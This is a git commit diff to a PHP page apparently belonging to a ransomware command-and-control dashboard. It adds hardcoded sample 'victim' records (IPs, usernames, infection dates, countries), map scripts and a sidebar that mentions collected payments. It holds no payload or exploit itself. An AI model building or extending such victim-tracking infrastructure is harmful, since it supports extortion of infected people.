72fd92f8f7976088497faa146b3cc1f5c1633ea5
HaaaToka <okanalan97.14@gmail.com>
2020-12-20 16:51:27 -0500

    dashboard :: missing files added

--- server/CCdashboard/Status/index.php
+++ server/CCdashboard/Status/index.php
@@ -1,3 +1,4 @@
+
 <?php
 
 function getAllVictims(){
@@ -6,9 +7,13 @@ function getAllVictims(){
     $query = "SELECT * FROM ...";
 
     $infos = array(
-        array("id"=>"1", "ip"=>"192.168.1.1", "username"=>"okan", "infection_date"=>"19/12/2020 21:33", "first_touch"=> "20/12/2020 09=>33", "country"=>"Turkey"),
-        array("id"=>"3", "ip"=>"12.32.12.1", "username"=>"ogulcan", "infection_date"=>"11/11/2020 21:33", "first_touch"=> "11/11/2020 21=>43", "country"=>"Turkey"),
-        array("id"=>"4", "ip"=>"34.43.15.12", "username"=>"idil", "infection_date"=>"19/12/2020 11:33", "first_touch"=> "20/12/2020 19=>33", "country"=>"Germany")
+        array("id"=>"11", "ip"=>"64.67.82.11", "username"=>"han", "infection_date"=>"01/11/2020 23:21", "first_touch"=> "01/11/2020 23:22", "country"=>"China"),
+        array("id"=>"3", "ip"=>"34.32.1.31", "username"=>"ahmet", "infection_date"=>"11/11/2020 01:41", "first_touch"=> "11/11/2020 21:43", "country"=>"Turkey"),
+        array("id"=>"34", "ip"=>"12.32.12.1", "username"=>"ogulcan", "infection_date"=>"15/11/2020 17:03", "first_touch"=> "16/11/2020 17:03", "country"=>"Turkey"),
+        array("id"=>"1", "ip"=>"192.168.1.1", "username"=>"okan", "infection_date"=>"19/12/2020 21:33", "first_touch"=> "20/12/2020 09:33", "country"=>"Turkey"),
+        array("id"=>"4", "ip"=>"13.32.1.1", "username"=>"alan", "infection_date"=>"01/12/2020 02:12", "first_touch"=> "01/12/2020 02:14", "country"=>"USA"),
+        array("id"=>"43", "ip"=>"34.43.15.12", "username"=>"idil", "infection_date"=>"19/12/2020 11:31", "first_touch"=> "20/12/2020 19:33", "country"=>"Germany"),
+        array("id"=>"13", "ip"=>"25.16.13.21", "username"=>"solo", "infection_date"=>"23/12/2020 12:38", "first_touch"=> "23/12/2020 20:05", "country"=>"UK"),
     );
 
     return json_encode($infos);
@@ -85,19 +90,28 @@ function createVictimTable(){
             </nav>
         </div>
 
+        <script src="/js/core.js"></script>
+        <script src="/js/maps.js"></script>
+        <script src="/js/animated.js"></script>
+        <script src="/js/worldLow.js"></script>
+        <script src="/js/worldmap.js"></script>
+
+        
+
         <div class="container">
             <div class="row">
-                <div class="sidenav" style="margin-top: 86px; width: auto; background-color: #242640">
+                <div id="chartdiv"></div>
+            </div>
+            <div class="row">
+                <div class="sidenav" style="margin-top: 85px; width: auto; background-color: #242640">
                     <a href="index.php">Active Victims</a><!-- index page -->
                     <a href="statistics.php">Statics</a> <!-- it will produced using payment rate, amount of collected money... -->
                 </div>
                 <div class="col-sm">
-                    HEY MAP MAP
                     <?php print(createVictimTable());?>
                 </div>
             </div>
         </div>
-
 
 
         <script src="/js/jquery-3.5.1.slim.min.js"></script>
